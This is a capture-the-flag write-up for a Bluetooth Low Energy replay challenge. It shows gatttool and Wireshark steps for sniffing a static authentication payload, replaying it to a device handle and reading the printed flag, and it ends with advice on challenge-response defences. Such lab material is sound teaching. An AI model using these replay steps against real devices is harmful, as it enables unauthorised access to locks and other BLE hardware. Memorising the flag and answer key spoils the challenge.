# Writeup - Challenge 08: Replay Attack

**Difficulty:** ⭐⭐⭐⭐ Advanced
**Category:** Bluetooth Low Energy
**Flag:** `WOCSA{replay_attacks_bypass_auth}`

---

## 🔍 Step 1: Open the PCAP in Wireshark

A file `capture.pcap` is provided in the challenge folder. Open it in Wireshark:

```bash
wireshark capture.pcap
```

---

## 🔎 Step 2: Filter for BLE ATT Write Operations

In the Wireshark filter bar, enter:

```
btatt.opcode == 0x12
```

This filters for **ATT Write Request** packets (opcode `0x12`).

You will see a packet:
```
Frame X: ATT Write Request, Handle: 0x000b, Value: de ad be ef
```

The **magic payload** is `DE AD BE EF`.

---

## 📋 Step 3: Identify the Target Handle

From the PCAP, note the handle used for the write: `0x000b`.

To confirm the corresponding UUID, look at the device's service discovery packets in the PCAP (opcode `0x08` / `0x0e` for read by group type / find by type responses).

The handle maps to: `facade00-0002-1000-8000-00805f9b34fb` (AUTH characteristic).

---

## ▶️ Step 4: Replay the Payload

```bash
gatttool -b AA:BB:CC:DD:EE:FF -I
[AA:BB:CC:DD:EE:FF][LE]> connect
[AA:BB:CC:DD:EE:FF][LE]> char-write-req 0x000b deadbeef
```

---

## 📖 Step 5: Read the Flag

```bash
[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0009
```

Expected output:
```
Characteristic value/descriptor: 57 4f 43 53 41 7b...
```

```
WOCSA{replay_attacks_bypass_auth}
```

---

## 🎯 Flag

```
WOCSA{replay_attacks_bypass_auth}
```

---

## Key Takeaways

* Authentication based on a **static secret payload** (no nonce, no timestamp, no challenge-response) is vulnerable to replay attacks
* An attacker with a BLE sniffer capturing one legitimate authentication can replay it indefinitely
* **Defense:** Use challenge-response authentication — the server sends a fresh random nonce, the client must sign it with a shared secret (HMAC). The response is different every time.
* Even without breaking cryptography, passive sniffing + replaying is often sufficient to defeat weak BLE auth implementations
* Tools like Ubertooth One or Nordic Semiconductor nRF Sniffer can capture BLE traffic live for analysis
